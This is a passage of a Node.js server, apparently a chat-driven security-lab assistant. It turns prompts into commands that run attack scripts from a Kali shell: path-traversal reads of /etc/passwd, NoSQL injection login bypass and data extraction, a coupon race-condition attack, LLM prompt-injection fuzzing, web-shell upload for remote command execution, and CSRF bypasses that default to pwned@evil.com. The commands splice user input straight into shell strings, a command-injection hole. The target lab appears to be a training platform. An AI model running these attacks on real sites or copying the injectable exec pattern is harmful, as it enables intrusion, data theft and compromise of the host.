            console.log(`📂 Testing Absolute Path Bypass: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 45000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (err && !output.includes("MATCH_FOUND")) {
                    return res.json({ reply: "❌ Absolute Bypass Failed", details: stderr });
                }
                
                if (output.includes("MATCH_FOUND")) {
                    const parts = output.split("---------------------------------------");
                    return res.json({
                        reply: `🎯 **Absolute Path Bypass Successful!**\n${parts[0]}\n\n\`\`\`\n${parts[1]}\n\`\`\``,
                        status: "Exploit successful."
                    });
                }
                
                return res.json({ reply: "⚠️ Target is not vulnerable to simple absolute path injection." });
            });
            return;
        }
        
        if (lowerPrompt.includes("start path") || lowerPrompt.includes("prefix bypass")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const paramMatch = prompt.match(/parameter[:\s]+([^\s]+)/i) || ["", "filename"];
            // Capture the required path, e.g., /var/www/images/
            const prefixMatch = prompt.match(/prefix[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const param = paramMatch[1];
            const prefix = prefixMatch ? prefixMatch[1] : "/var/www/images/";
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL. Use: 'scan start path labURL: [url] prefix: [/path/]'" });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/traversal_startpath.sh ${target} ${param} ${prefix} /etc/passwd"`;
            
            console.log(`📂 Testing Start-Path Bypass: ${target} (Prefix: ${prefix})`);
            
            exec(wslCmd, { shell: true, timeout: 60000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (err && !output.includes("MATCH_FOUND")) {
                    return res.json({ reply: "❌ Bypass Failed", details: stderr });
                }
                
                if (output.includes("MATCH_FOUND")) {
                    const fileContent = output.split("---------------------------------------")[1];
                    return res.json({
                        reply: `🎯 **Start-Path Validation Bypassed!**\n\n\`\`\`\n${fileContent}\n\`\`\``,
                        status: "Exploit successful."
                    });
                }
                
                return res.json({ reply: "⚠️ Could not bypass validation with the provided prefix." });
            });
            return;
        }
        
        if (lowerPrompt.includes("superfluous") || lowerPrompt.includes("double encode")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const paramMatch = prompt.match(/parameter[:\s]+([^\s]+)/i) || ["", "filename"];
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const param = paramMatch[1];
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL for Double Encoding test." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/traversal_superfluous.sh ${target} ${param} /etc/passwd"`;
            
            console.log(`📂 Testing Superfluous Decode Bypass: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 60000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (err && !output.includes("MATCH_FOUND")) {
                    return res.json({ reply: "❌ Double Encoding Bypass Failed", details: stderr });
                }
                
                if (output.includes("MATCH_FOUND")) {
                    const parts = output.split("---------------------------------------");
                    return res.json({
                        reply: `🎯 **Superfluous Decode Bypassed!**\n${parts[0]}\n\n\`\`\`\n${parts[1]}\n\`\`\``,
                        status: "Exploit successful."
                    });
                }
                
                return res.json({ reply: "⚠️ The filter is not vulnerable to superfluous decoding at this depth." });
            });
            return;
        }
        
        if (lowerPrompt.includes("nosql injection") || lowerPrompt.includes("operator injection")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Please provide a labURL to test for NoSQL injection." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            // Determine the mode: Bypassing login (ne) or extracting data (regex)
            let mode = "bypass"; // Default to login bypass
            if (lowerPrompt.includes("extract") || lowerPrompt.includes("brute") || lowerPrompt.includes("regex")) {
                mode = "extract";
            }
            
            // Capture target username if specified (e.g., "for user administrator")
            const userMatch = prompt.match(/for (?:user\s+)?([^\s?]+)/i) || ["", "admin"];
            const targetUser = userMatch[1];
            
            // Construct the WSL command
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/nosql_operator_scan.sh ${target} ${mode} ${targetUser}"`;
            
            console.log(`🧪 Testing NoSQL Operator Injection [MODE: ${mode.toUpperCase()}]: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 180000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({
                        reply: "❌ NoSQL Injection Engine Failure",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                return res.json({
                    reply: output ? `🛡️ **NoSQL Injection Report for ${target}:**\n\n${output}` : "⚠️ No NoSQL vulnerabilities detected with the standard operator set.",
                    status: "NoSQL analysis finished."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("nosql syntax") || lowerPrompt.includes("syntax injection")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const target = sanitizeUrl(labUrlMatch ? labUrlMatch[1] : (labUrl || ""));
            const paramMatch = prompt.match(/parameter[:\s]+([^\s]+)/i) || ["", "category"];
            
            // --- INTENT PARSING LOGIC ---
            let intentMode = "generic";
            if (lowerPrompt.includes("unreleased") || lowerPrompt.includes("hidden")) {
                intentMode = "leak_all";
            } else if (lowerPrompt.includes("admin") || lowerPrompt.includes("login")) {
                intentMode = "bypass_user";
            } else if (lowerPrompt.includes("password") || lowerPrompt.includes("token")) {
                intentMode = "extract_data";
            }
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/nosql_syntax_smart.sh ${target} ${paramMatch[1]} ${intentMode}"`;
            
            console.log(`📡 Intent-Driven Scan [${intentMode.toUpperCase()}] on ${target}`);
            
            exec(wslCmd, { shell: true }, (err, stdout, stderr) => {
                res.json({
                    reply: stdout || "Operation complete.",
                    status: "NoSQL Analysis Finished"
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("race condition") || lowerPrompt.includes("limit overrun")) {
            // Regex extractors for URL, Coupon, Threads, and Session
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const couponMatch = prompt.match(/coupon[:\s]+([^\s]+)/i) || prompt.match(/code[:\s]+([^\s]+)/i);
            const threadsMatch = prompt.match(/threads[:\s]+(\d+)/i) || ["", "20"]; 
            const sessionMatch = prompt.match(/session[:\s]+([^\s]+)/i) || prompt.match(/cookie[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalCoupon = couponMatch ? couponMatch[1] : "PROMO20";
            const threads = threadsMatch[1];
            const sessionID = sessionMatch ? sessionMatch[1] : null;
            
            // Validation
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Please provide a labURL. Example: 'attack race condition labURL: https://... coupon: PROMO20 session: YOUR_ID'" });
            }
            if (!sessionID) {
                return res.json({ reply: "❌ Session Cookie is required for this attack. Please include 'session: [ID]' in your prompt." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            /**
             * WSL Command Construction
             * We use 'go run' to execute the .go file directly.
             * Arguments passed: [1] URL, [2] Coupon, [3] Threads, [4] Session
             **/
            const wslCmd = `wsl -d kali-linux -- go run /home/HAQCORE/scripts/race_limit_attack.go "${target}" "${finalCoupon}" ${threads} "${sessionID}"`;
            
            console.log(`🚀 Launching Race Condition Attack: ${target} (Threads: ${threads})`);
            
            exec(wslCmd, { shell: true, timeout: 60000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                // Handle execution errors
                if (err && !output) {
                    return res.json({
                        reply: "❌ Race Engine Failure",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                // Return the Go script's output (the status codes for each request)
                return res.json({
                    reply: output ? `🏁 **Race Condition Results for ${target}:**\n\n${output}` : "⚠️ Attack completed, but no evidence of multi-application detected.",
                    status: "Race condition sequence finished."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("web llm attacks") || lowerPrompt.includes("automate llm")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const sessionMatch = prompt.match(/session[:\s]+([^\s]+)/i);
            const endpointMatch = prompt.match(/endpoint[:\s]+([^\s]+)/i);
            const goalMatch = prompt.match(/goal[:\s]+([^format]+)/i); // Stop at 'format'
            const formatMatch = prompt.match(/format[:\s]+({.+})/i); // Capture the JSON object
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : "";
            const session = sessionMatch ? sessionMatch[1] : "";
            const endpoint = endpointMatch ? endpointMatch[1] : "/chat";
            const goal = goalMatch ? goalMatch[1].trim() : "extract system info";
            // Default format if none provided
            const format = formatMatch ? formatMatch[1] : '{"message":"VALUE"}';
            
            if (!finalLabUrl || !session) {
                return res.json({
                    reply: "I'm sorry, I'm not able to assist you with that since Web LLM attacks cannot be done automatically without a labURL and session...",
                    status: "Awaiting Parameters"
                });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            const wslCmd = `wsl -d kali-linux -- bash -c "python3 /home/HAQCORE/scripts/llm_fuzzer.py '${target}' '${session}' '${endpoint}' '${goal.replace(/'/g, "")}' '${format.replace(/'/g, '"')}'"`;
            
            console.log(`🚀 Routing Attack to ${endpoint} with format ${format}`);
            
            exec(wslCmd, { shell: true, timeout: 90000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({ reply: "❌ Execution Error", details: stderr });
                }
                
                return res.json({
                    reply: `🛠️ **Dynamic LLM Attack Result**\n**Goal:** ${goal}\n**Format:** \`${format}\`\n\n${output}`,
                    status: "Sequence Complete"
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("hunt shell") || lowerPrompt.includes("advanced exploit") || lowerPrompt.includes("upload")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const sessionMatch = prompt.match(/session[:\s]+([^\s]+)/i);
            const cmdMatch = prompt.match(/run[:\s]+"(.*)"/i) || ["", "cat /home/carlos/secret"];
            
            const target = sanitizeUrl(labUrlMatch ? labUrlMatch[1] : (labUrl || ""));
            const session = sessionMatch ? sessionMatch[1] : "";
            const command = cmdMatch[1];
            
            if (!target || !session) {
                return res.json({ reply: "⚠️ Need labURL and session for the Master Hunter to track renames and bypass filters." });
            }
            
            // --- Dynamic Strategy Selection ---
            let strategy = "standard";
            let mimeType = "application/x-php";
            
            if (lowerPrompt.includes("traversal")) strategy = "traversal";
            if (lowerPrompt.includes("null byte")) strategy = "nullbyte";
            
            // Automatically elevate to image/jpeg if bypass is mentioned
            if (lowerPrompt.includes("bypass") || lowerPrompt.includes("restriction") || lowerPrompt.includes("mime")) {
                mimeType = "image/jpeg";
            }
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/upload_master.sh ${target} ${session} '${command}' ${strategy} ${mimeType}"`;
            
            console.log(`🎯 Master Hunter Activated [${strategy.toUpperCase()} | ${mimeType}]: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 90000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (output.includes("SUCCESS_MATCH")) {
                    const lines = output.split("\n");
                    const urlLine = lines.find(l => l.startsWith("URL:")) || "";
                    const dataLine = lines.find(l => l.startsWith("RESULT:")) || "";
                    
                    return res.json({
                        reply: `💀 **RCE EVOLVED: SUCCESS**\n\n**Strategy:** ${strategy} (${mimeType})\n**Detection:** The Hunter successfully tracked the file even through server renames.\n\n**New Path:** \`${urlLine.replace("URL: ", "")}\`\n**Output:**\n\`\`\`\n${dataLine.replace("RESULT: ", "")}\n\`\`\``,
                        status: "Hunter sequence finished."
                    });
                }
                
                return res.json({
                    reply: "⚠️ The Hunter lost the trail. The file might be renamed without UI reflection, deleted instantly by a race condition, or execution was successfully blocked.",
                    details: output || stderr,
                    status: "Search complete."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("csrf") && lowerPrompt.includes("bypass")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const cookieMatch = prompt.match(/cookie[:\s]+['"]([^'"]+)['"]/i) || prompt.match(/cookie[:\s]+([^\s]+)/i);
            const tokenMatch = prompt.match(/attackerToken[:\s]+([^\s]+)/i);
            
            // NEW: Extract email if provided (e.g., "use email: victim@test.com")
            const emailMatch = prompt.match(/email[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalCookie = cookieMatch ? cookieMatch[1] : "";
            const finalToken = tokenMatch ? tokenMatch[1] : "NONE";
            const finalEmail = emailMatch ? emailMatch[1] : "pwned@evil.com";
            
            let mode = "omission"; // default
            if (lowerPrompt.includes("method")) mode = "method_swap";
            if (lowerPrompt.includes("session")) mode = "session_mismatch";
            if (lowerPrompt.includes("referer")) mode = "referer_strip";
            
            // Pass 5 arguments: Target, Cookie, Mode, Token, Email
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/csrf_test.sh '${finalLabUrl}' '${finalCookie}' '${mode}' '${finalToken}' '${finalEmail}'"`;
            
            console.log(`📡 Launching CSRF Attack: ${mode} -> ${finalEmail}`);
            
            exec(wslCmd, { shell: true }, (err, stdout, stderr) => {
                // ... same response logic as before
            });
        }
        
        if (lowerPrompt.includes("csrf") && lowerPrompt.includes("referer")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const cookieMatch = prompt.match(/cookie[:\s]+['"]([^'"]+)['"]/i) || prompt.match(/cookie[:\s]+([^\s]+)/i);
            const domainMatch = prompt.match(/trustedDomain[:\s]+([^\s]+)/i);
            const emailMatch = prompt.match(/email[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalCookie = cookieMatch ? cookieMatch[1] : "";
            const finalEmail = emailMatch ? emailMatch[1] : "pwned@evil.com";
            
            // Extract domain from labURL if trustedDomain isn't explicitly provided
            const finalDomain = domainMatch ? domainMatch[1] : new URL(finalLabUrl).hostname;
            
            let mode = "referer_omission";
            if (lowerPrompt.includes("regex") || lowerPrompt.includes("contain")) mode = "referer_regex_bypass";
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/csrf_referer_test.sh '${finalLabUrl}' '${finalCookie}' '${mode}' '${finalDomain}' '${finalEmail}'"`;
            
            console.log(`📡 Referer Bypass Attempt [${mode.toUpperCase()}]: ${finalLabUrl}`);
            
            exec(wslCmd, { shell: true }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) return res.json({ reply: "❌ Referer Test Failed", details: stderr });
                
                return res.json({
                    reply: `🛡️ **Referer Bypass Report:**\n\n${output}`,
                    status: "Referer analysis finished."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("csrf") && lowerPrompt.includes("samesite")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const cookieMatch = prompt.match(/cookie[:\s]+['"]([^'"]+)['"]/i) || prompt.match(/cookie[:\s]+([^\s]+)/i);
            const emailMatch = prompt.match(/email[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalCookie = cookieMatch ? cookieMatch[1] : "";
            const finalEmail = emailMatch ? emailMatch[1] : "pwned@evil.com";
            
            let mode = "samesite_lax_get";
            if (lowerPrompt.includes("strict")) mode = "samesite_strict_bypass";
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/csrf_samesite_test.sh '${finalLabUrl}' '${finalCookie}' '${mode}' '${finalEmail}'"`;
            
            console.log(`📡 SameSite Analysis [${mode.toUpperCase()}]: ${finalLabUrl}`);
            
            exec(wslCmd, { shell: true }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) return res.json({ reply: "❌ SameSite Test Failed", details: stderr });
                
                return res.json({
                    reply: `🛡️ **SameSite Bypass Analysis for ${finalLabUrl}:**\n\n${output}`,
                    status: "SameSite analysis complete."
                });
            });
            return;
        }

        // ================================
        // 🤖 GROQ AI (CLOUD)
        // ================================
        const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
           method: "POST",
           headers: {
               "Content-Type": "application/json",
               "Authorization": `Bearer ${process.env.GROQ_API_KEY}`
           },
           body: JSON.stringify({
               model: "llama3-8b-8192",   // or mixtral-8x7b-32768
               messages: [
                   {
                       role: "system",
                       content: "You are a helpful cybersecurity learning assistant."
                   },
                   {
                       role: "user",
                       content: prompt
                   }
                   ],
               temperature: 0.7
           })
        });

        const data = await response.json();

        return res.json({
            reply: data.response || "No response"
        });


    } catch (err) {
        console.error(err);
        if (!res.headersSent) {
            res.status(500).json({ reply: "Server error" });
        }
    }
});

// ================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("HAQCORE Server running on port " + PORT));
